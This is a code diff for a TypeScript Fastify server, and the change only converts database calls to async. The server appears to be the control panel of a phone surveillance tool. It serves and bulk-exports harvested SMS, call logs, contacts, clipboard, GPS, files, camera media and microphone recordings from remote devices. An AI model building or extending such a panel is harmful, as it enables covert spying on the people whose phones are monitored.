@@ -139,7 +139,7 @@ export async function deviceRoutes(app: FastifyInstance) {
     socketService.disconnectClient(id);
     socketService.setGps(id, 0);
     await d.delete(clients).where(eq(clients.id, id));
-    dbHelpers.addLog('INFO', 'CLIENT', `Client ${id} deleted`);
+    (await dbHelpers.addLog('INFO', 'CLIENT', `Client ${id} deleted`));
     return { success: true, message: 'Client deleted' };
   });
 
@@ -173,7 +173,7 @@ export async function deviceRoutes(app: FastifyInstance) {
         'cameras', 'mic_status', 'notification_status',
       ];
       for (const dt of dataTypes) {
-        const raw = dbHelpers.getOrCreateClientData(id, dt);
+        const raw = (await dbHelpers.getOrCreateClientData(id, dt));
         let parsed: unknown = safeJsonParse(raw, []);
         if (dt === 'permissions' && Array.isArray(parsed)) {
           parsed = normalizePermissions(parsed);
@@ -211,7 +211,7 @@ export async function deviceRoutes(app: FastifyInstance) {
       }));
       zip.addFile(`${folderName}/file-index.json`, Buffer.from(JSON.stringify(fileIndex, null, 2), 'utf-8'));
       const zipBuffer = zip.toBuffer();
-      dbHelpers.addLog('DATA', 'EXPORT', `Exported all data for ${id}`, JSON.stringify({ files: allFiles.length, size: zipBuffer.length }));
+      (await dbHelpers.addLog('DATA', 'EXPORT', `Exported all data for ${id}`, JSON.stringify({ files: allFiles.length, size: zipBuffer.length })));
       const safeId = id.replace(/[^a-zA-Z0-9_-]/g, '_');
       reply.header('Content-Type', 'application/zip');
       reply.header('Content-Disposition', `attachment; filename="spork-data-${safeId}.zip"`);
@@ -297,9 +297,9 @@ export async function deviceRoutes(app: FastifyInstance) {
     if (!client) {
       return reply.code(404).send({ success: false, error: 'Client not found' });
     }
-    dbHelpers.assignDevice(id, ownerId);
+    (await dbHelpers.assignDevice(id, ownerId));
     socketService.invalidateDeviceOwner(id);
-    dbHelpers.addLog('ADMIN', 'DEVICE', `Device ${id} assigned to user ${ownerId}`);
+    (await dbHelpers.addLog('ADMIN', 'DEVICE', `Device ${id} assigned to user ${ownerId}`));
     return { success: true, message: 'Device assigned' };
   });
 
@@ -317,9 +317,9 @@ export async function deviceRoutes(app: FastifyInstance) {
     if (!client) {
       return reply.code(404).send({ success: false, error: 'Client not found' });
     }
-    dbHelpers.unassignDevice(id);
+    (await dbHelpers.unassignDevice(id));
     socketService.invalidateDeviceOwner(id);
-    dbHelpers.addLog('ADMIN', 'DEVICE', `Device ${id} unassigned`);
+    (await dbHelpers.addLog('ADMIN', 'DEVICE', `Device ${id} unassigned`));
     return { success: true, message: 'Device unassigned' };
   });
 }
@@ -328,7 +328,7 @@ function safeJsonParse(str: string, fallback: any = []): any {
   try { return JSON.parse(str); } catch { return fallback; }
 }
 
-function getPageData(id: string, page: string, client: any) {
+async function getPageData(id: string, page: string, client: any) {
   switch (page) {
     case 'info': {
       const rawInfo = client.deviceInfo ? safeJsonParse(client.deviceInfo, null) : null;
@@ -336,74 +336,74 @@ function getPageData(id: string, page: string, client: any) {
       return { client: formatClient(client), deviceInfo };
     }
     case 'sms': {
-      const smsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'sms'));
+      const smsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'sms')));
       return { list: Array.isArray(smsData) ? smsData : [] };
     }
     case 'calls': {
-      const callsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'calls'));
+      const callsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'calls')));
       return { list: Array.isArray(callsData) ? callsData : [] };
     }
     case 'contacts': {
-      const contactsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'contacts'));
+      const contactsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'contacts')));
       return { list: Array.isArray(contactsData) ? contactsData : [] };
     }
     case 'wifi': {
-      const wifiData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'wifi'));
-      const wifiErrorData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'wifi_error'), null);
+      const wifiData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'wifi')));
+      const wifiErrorData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'wifi_error')), null);
       return {
         list: Array.isArray(wifiData) ? wifiData : [],
         error: wifiErrorData?.error || (wifiData?.error as string) || null,
       };
     }
     case 'clipboard': {
-      const clipData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
+      const clipData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'clipboard')));
       return { list: Array.isArray(clipData) ? clipData : [] };
     }
     case 'notifications': {
-      const notifData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'notifications'));
-      const notifStatus = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'notification_status'), null);
+      const notifData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'notifications')));
+      const notifStatus = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'notification_status')), null);
       return {
         list: Array.isArray(notifData) ? notifData : [],
         status: notifStatus || null,
       };
     }
     case 'permissions': {
-      const rawPerms = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'permissions'));
+      const rawPerms = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'permissions')));
       return { list: normalizePermissions(rawPerms) };
     }
     case 'apps': {
-      const appsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'apps'));
+      const appsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'apps')));
       return { list: Array.isArray(appsData) ? appsData : [] };
     }
     case 'gps': {
-      const gpsData = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'gps'));
+      const gpsData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'gps')));
       return {
         list: Array.isArray(gpsData) ? gpsData : [],
         interval: client.gpsInterval,
       };
     }
     case 'files': {
-      const rawFiles = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'files'));
+      const rawFiles = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'files')));
       const fileList = Array.isArray(rawFiles) ? normalizeFileList(rawFiles) : [];
-      const fileError = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'file_error'), null);
+      const fileError = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'file_error')), null);
       return { list: fileList, path: client.currentPath, error: fileError?.error || null };
     }
     case 'downloads': {
-      const downloads = dbHelpers.getClientFiles(id, 'download');
-      const uploads = dbHelpers.getClientFiles(id, 'upload');
+      const downloads = (await dbHelpers.getClientFiles(id, 'download'));
+      const uploads = (await dbHelpers.getClientFiles(id, 'upload'));
       return { list: [...downloads, ...uploads] };
     }
     case 'camera': {
-      const rawCameras = dbHelpers.getOrCreateClientData(id, 'cameras');
+      const rawCameras = (await dbHelpers.getOrCreateClientData(id, 'cameras'));
       const cameras = safeJsonParse(rawCameras);
-      const photos = dbHelpers.getClientFiles(id, 'photo');
-      const videos = dbHelpers.getClientFiles(id, 'video');
+      const photos = (await dbHelpers.getClientFiles(id, 'photo'));
+      const videos = (await dbHelpers.getClientFiles(id, 'video'));
       const camerasDetected = rawCameras !== '[]';
       return { cameras: cameras || [], photos, videos, permission: camerasDetected ? client.cameraPermission : null };
     }
     case 'mic': {
-      const recordings = dbHelpers.getClientFiles(id, 'recording');
-      const micStatus = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'mic_status'));
+      const recordings = (await dbHelpers.getClientFiles(id, 'recording'));
+      const micStatus = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'mic_status')));
       return { list: recordings, status: micStatus || null };
     }
     case 'fason':
@@ -440,8 +440,8 @@ export function formatClient(client: ClientRow) {
   };
 }
 
-function canAccessDevice(user: { userId: string; role: string }, clientId: string): boolean {
+async function canAccessDevice(user: { userId: string; role: string }, clientId: string): Promise<boolean> {
   if (user.role === 'admin') return true;
-  const ownerId = dbHelpers.getDeviceOwnerId(clientId);
+  const ownerId = (await dbHelpers.getDeviceOwnerId(clientId));
   return ownerId === user.userId;
 }
